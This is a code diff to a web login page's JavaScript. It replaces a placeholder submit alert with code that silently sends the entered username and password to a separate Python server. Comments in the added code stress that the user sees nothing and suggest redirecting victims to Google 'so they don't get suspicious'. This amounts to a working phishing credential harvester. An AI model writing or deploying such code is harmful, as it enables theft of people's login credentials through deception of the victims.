@@ -305,35 +305,52 @@
 
   <script>
     function togglePassword() {
-      const passwordInput = document.getElementById('password');
-      const toggleButton = document.querySelector('.password-toggle');
-      if (passwordInput.type === 'password') {
+    const passwordInput = document.getElementById('password');
+    const toggleButton = document.querySelector('.password-toggle');
+    if (passwordInput.type === 'password') {
         passwordInput.type = 'text';
         toggleButton.textContent = '🙈';
-      } else {
+    } else {
         passwordInput.type = 'password';
         toggleButton.textContent = '👁';
-      }
     }
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
-      e.preventDefault();
-      const account = document.getElementById('account').value;
-      const password = document.getElementById('password').value;
-      if (account && password) {
-        alert('Login functionality would be implemented here');
-      } else {
-        alert('Please fill in all fields');
-      }
+}
+
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault(); 
+
+    const account = document.getElementById('account').value;
+    const password = document.getElementById('password').value;
+
+    // Send data silently to your Python server
+    fetch('http://localhost:5000', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            username: account,
+            password: password
+        })
+    })
+    .catch(error => {
+        // We log to the console for your debugging, but the user won't see an alert
+        console.error('Connection failed:', error);
     });
-    // Add some interactive effects
-    document.querySelectorAll('.form-input').forEach(input => {
-      input.addEventListener('focus', function() {
+
+    // OPTIONAL: Redirect the user to a real page so they don't get suspicious
+    // window.location.href = "https://www.google.com"; 
+});
+
+// Interactive effects
+document.querySelectorAll('.form-input').forEach(input => {
+    input.addEventListener('focus', function() {
         this.parentElement.style.transform = 'scale(1.02)';
-      });
-      input.addEventListener('blur', function() {
-        this.parentElement.style.transform = 'scale(1)';
-      });
     });
+    input.addEventListener('blur', function() {
+        this.parentElement.style.transform = 'scale(1)';
+    });
+});
   </script>
 </body>
 
